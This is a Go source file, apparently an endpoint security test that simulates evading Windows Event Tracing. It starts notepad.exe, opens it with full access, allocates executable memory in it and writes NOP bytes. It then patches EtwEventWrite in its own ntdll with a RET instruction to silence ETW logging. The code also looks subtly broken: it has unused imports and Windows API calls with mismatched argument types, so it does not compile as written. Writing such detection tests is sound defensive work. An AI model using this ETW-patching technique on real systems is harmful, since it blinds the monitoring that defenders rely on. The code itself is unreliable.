/*
ID: 3046168a-91cb-4ecd-a061-b75b1df1c107
NAME: Evasion via Event Tracing for Windows Patching
CREATED: 2024-07-02
scenario: attempts to patch Microsoft Event Tracing for Windows via memory modification. This may indicate an attempt
to disrupt detection of malicious activity by the Event Tracing facility for Windows.
*/
package main

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"unsafe"

	Endpoint "github.com/preludeorg/test/endpoint"
	"golang.org/x/sys/windows"
)

func main() {
	Endpoint.Say("[+] Starting Evasion via Event Tracing for Windows Patching VST")
	Endpoint.Start(test, cleanup)
}

func test() {
	procHandle := windows.Handle(0)
	var err error

	// start process
	cmd := exec.Command("notepad.exe")
	err = cmd.Start()
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to start process: %s", err))
		Endpoint.Stop(1) // ERROR
	}
	defer cmd.Process.Kill()

	// get process handle
	procHandle, err = windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, uint32(cmd.Process.Pid))
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to get process handle: %s", err))
		Endpoint.Stop(1) // ERROR
	}

	// allocate memory in target
	var remoteAddr uintptr
	remoteAddr, err = windows.VirtualAllocEx(procHandle, 0, 4096, windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to allocate memory: %s", err))
		Endpoint.Stop(1) // ERROR
	}

	// write dummy data to allocate memory [NOP slide to simulate patching]
	dummyData := []byte{0x90, 0x90, 0x90, 0x90}
	var written uint32
	err = windows.WriteProcessMemory(procHandle, remoteAddr, &dummyData[0], uint32(len(dummyData)), &written)
	if err != nil || written != uint32(len(dummyData)) {
		Endpoint.Say(fmt.Sprintf("[-] Failed to write to process memory: %s", err))
		Endpoint.Stop(1) // ERROR
	}
	// Verify the memory was patched
	verifyMemoryPatch(procHandle, remoteAddr, dummyData)

	// Attempt to patch ETW functions
	patchETW()

	Endpoint.Say("[+] ETW patching executed successfully")
	Endpoint.Stop(101) // UNPROTECTED: Malicious behavior not blocked

}

func patchETW() {
	// patching ETW functions in ntdll.dll
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	etwEventWrite := ntdll.NewProc("EtwEventWrite")

	// allocate memory for patch
	mem, err := windows.VirtualAlloc(0, 4096, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to allocate memory for ETW patch: %s", err))
		Endpoint.Stop(1) // ERROR
	}

	// write patch to memory
	patch := []byte{0xC3} // RET instruction to bypass function
	copy((*(*[1 << 20]byte)(unsafe.Pointer(mem)))[:], patch)

	// patch EtwEventWrite
	err = windows.WriteProcessMemory(windows.CurrentProcess(), etwEventWrite.Addr(), &patch[0], uintptr(len(patch)), nil)
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to patch EtwEventWrite: %s", err))
		Endpoint.Stop(1) // ERROR
	}
}

func verifyMemoryPatch(procHandle windows.Handle, remoteAddr uintptr, expectedData []byte) {
	buffer := make([]byte, len(expectedData))
	var read uint32
	err := windows.ReadProcessMemory(procHandle, remoteAddr, &buffer[0], uint32(len(buffer)), &read)
	if err != nil || read != uint32(len(buffer)) || !compareBuffers(buffer, expectedData) {
		Endpoint.Say("[-] Memory patch verification failed")
		Endpoint.Stop(1) // ERROR
	}
	Endpoint.Say("[+] Memory patch verification succeeded")
}

func compareBuffers(buf1, buf2 []byte) bool {
	if len(buf1) != len(buf2) {
		return false
	}
	for i := range buf1 {
		if buf1[i] != buf2[i] {
			return false
		}
	}
	return true
}

func cleanup() {
	Endpoint.Say("[+] Cleanup completed successfully")
	Endpoint.Stop(100) // PROTECTED
}